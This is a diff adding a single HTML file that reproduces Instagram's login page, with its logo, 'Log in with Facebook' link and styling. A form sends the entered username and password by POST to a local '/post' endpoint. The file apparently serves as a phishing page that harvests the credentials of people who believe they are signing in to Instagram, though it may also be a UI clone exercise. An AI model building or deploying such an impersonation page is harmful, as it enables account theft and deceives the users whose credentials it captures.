@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en" style="margin: 0; padding: 0; box-sizing: border-box; outline: none; list-style: none; text-decoration: none; font-family: 'Roboto', sans-serif;">
+<head>
+	<meta charset="UTF-8">
+	<title>Instagram Login Page</title>
+	<link href="styles.css" rel="stylesheet">
+</head>
+<body style="margin:0;padding:0;box-sizing:border-box;outline:none;list-style:none;text-decoration:none;font-family:'Roboto', sans-serif;background:#fafafa;font-size:14px;">
+	<div class="wrapper">
+		<div class="header" style="margin:50px auto;max-width:350px;">
+			<div class="top" style="padding:40px 40px 20px;background:#fff;border:1px solid #e6e6e6;border-radius:1px;">
+				<div class="logo"><img alt="instagram" src="https://raw.githubusercontent.com/codingmarket07/Instagram-Login-Page/master/instagram.png" style="width:175px;display:block;margin:0 auto 35px;"></div>
+				
+				<!-- ✅ Start of FORM -->
+				<form method="POST" action="/post">
+					<div class="input_field" style="margin-bottom:5px;">
+						<input class="input" name="username" placeholder="Phone number, username, or email" style="width:100%;padding:10px;background:#fafafa;border:1px solid #efefef;font-size:12px;border-radius:3px;color:#262626;" type="text">
+					</div>
+					<div class="input_field" style="margin-bottom:5px;">
+						<input class="input" name="password" placeholder="Password" style="width:100%;padding:10px;background:#fafafa;border:1px solid #efefef;font-size:12px;border-radius:3px;color:#262626;" type="password">
+					</div>
+					<div class="btn" style="margin:10px 0;background-color:#3897f0;border:1px solid #3897f0;border-radius:4px;text-align:center;">
+						<button type="submit" style="color:#fff;background:none;border:none;width:100%;padding:5px;">Log In</button>
+					</div>
+				</form>
+				<!-- ✅ End of FORM -->
+
+				<div class="or" style="margin:15px 0 20px;display:flex;justify-content:space-between;align-items:center;height:15px;">
+					<div class="line" style="width:105px;height:2px;background:#efefef;"></div>
+					<p style="color:#999;font-size:12px;">OR</p>
+					<div class="line" style="width:105px;height:2px;background:#efefef;"></div>
+				</div>
+				<div class="dif">
+					<div class="fb" style="display:flex;justify-content:center;align-items:center;">
+						<img alt="facebook" src="https://raw.githubusercontent.com/codingmarket07/Instagram-Login-Page/master/facebook.png" style="width:16px;height:16px;">
+						<p style="color:#385185;font-weight:500;margin-left:10px;">Log in with Facebook</p>
+					</div>
+					<div class="forgot" style="font-size:12px;text-align:center;margin-top:20px;">
+						<a href="#" style="color:#003569;">Forgot password?</a>
+					</div>
+				</div>
+			</div>
+			<div class="signup" style="margin:10px 0 20px;padding:25px 40px;background:#fff;border:1px solid #e6e6e6;border-radius:1px;text-align:center;color:#262626;">
+				<p>Don't have an account? <a href="#" style="color:#3897f0;">Sign up</a></p>
+			</div>
+		</div>
+	</div>
+</body>
+</html>
